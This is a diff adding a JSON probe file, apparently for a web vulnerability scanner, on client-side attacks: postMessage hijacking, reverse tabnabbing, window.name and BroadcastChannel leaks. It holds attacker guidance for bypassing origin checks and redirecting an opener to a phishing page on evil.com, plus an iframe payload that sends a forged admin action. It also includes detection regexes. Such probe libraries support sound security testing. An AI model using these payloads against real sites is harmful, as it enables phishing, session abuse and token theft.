@@ -1,0 +1,78 @@
+{
+  "category": "client_side_request",
+  "description": "Client-side request forgery — postMessage hijacking, window.opener (reverse tabnabbing) chaining, fetch from window.name, BroadcastChannel abuse, SharedWorker leak. These are FRONTEND attacks driven by an attacker page or stored content; chain with XSS/CSRF/open-redirect for impact.",
+  "craft_guidance": [
+    "1. INVENTORY POSTMESSAGE: open DevTools, monkey-patch window.addEventListener('message', ...) on target. Note origins it accepts.",
+    "2. ORIGIN CHECK SLOPPINESS: many handlers do `e.origin.indexOf('target.com') !== -1` — bypass with 'target.com.evil.com' or 'evil.com?target.com'.",
+    "3. DATA SHAPE: send malformed JSON, undefined fields, prototype-polluted objects. See if handler crashes or sets state from fields it shouldn't.",
+    "4. WILDCARD POSTMESSAGE: target sends `postMessage(secret, '*')` — attacker iframe/popup captures it.",
+    "5. WINDOW.OPENER: target opens external link without rel='noopener'. Attacker page does `opener.location='https://evil.com/phish'`.",
+    "6. WINDOW.NAME: persists across navigation. Attacker sets window.name in attacker domain, victim navigates to target which reads window.name as data.",
+    "7. BROADCASTCHANNEL: same-origin only, but abuse via subdomain takeover or stored XSS that broadcasts.",
+    "8. SHAREDWORKER LEAK: workers persist across tabs. If a tab leaks data via SharedWorker, attacker tab reads it.",
+    "9. CHAIN: postMessage hijack alone is rarely high — chain with token theft, account-action via authenticated fetch from victim's session.",
+    "10. CSP IMPACT: even strict CSP doesn't block postMessage. Don't assume 'CSP present = safe'."
+  ],
+  "contexts": {
+    "postmessage_origin_bypass": {
+      "description": "Target's message handler has loose origin check; attacker frame passes the check and sends malicious data.",
+      "tech_match": [],
+      "param_match": ["message", "data", "type", "action"],
+      "probes": [
+        {
+          "payload": "<iframe src='https://target.com'></iframe><script>setTimeout(()=>frames[0].postMessage({type:'ADMIN_ACTION',data:'evil'},'*'),2000)</script>",
+          "description": "Cross-origin iframe + postMessage with admin action. Test if handler validates origin (it should reject).",
+          "matchers": [{"type": "word", "any": ["addEventListener('message'", "onmessage"]}],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "window_opener_attack": {
+      "description": "Target opens external link without rel='noopener noreferrer'. Attacker landing page redirects opener back to phishing clone.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<a href='https://target.com/share' target='_blank'>click</a>",
+          "description": "Confirm rel='noopener' missing. Check response HTML for `target='_blank'` without `rel='noopener'`.",
+          "matchers": [
+            {"type": "regex", "pattern": "target=['\\\"]_blank[^>]*>(?!.*rel=['\\\"][^'\\\"]*noopener)"},
+            {"type": "not_word", "words": ["noopener"]}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        }
+      ]
+    },
+    "wildcard_postmessage_send": {
+      "description": "Target sends sensitive data via postMessage with target origin '*'. Any iframe parent reads it.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Search response JS for `postMessage(.*,\\s*['\\\"]\\*['\\\"]\\)`. Confirm via browser_navigate + DevTools listener on opening parent.",
+          "matchers": [{"type": "regex", "pattern": "postMessage\\s*\\([^,]+,\\s*['\\\"]\\*['\\\"]"}],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "broadcast_channel_leak": {
+      "description": "Same-origin BroadcastChannel — if any subdomain has stored XSS or is taken over, attacker reads/writes channel messages.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Search response for `new BroadcastChannel(`. Channel name + handler logic in JS bundle reveals what data flows.",
+          "matchers": [{"type": "word", "any": ["BroadcastChannel", "new BroadcastChannel"]}],
+          "severity": "low",
+          "confidence_boost": 25
+        }
+      ]
+    }
+  }
+}
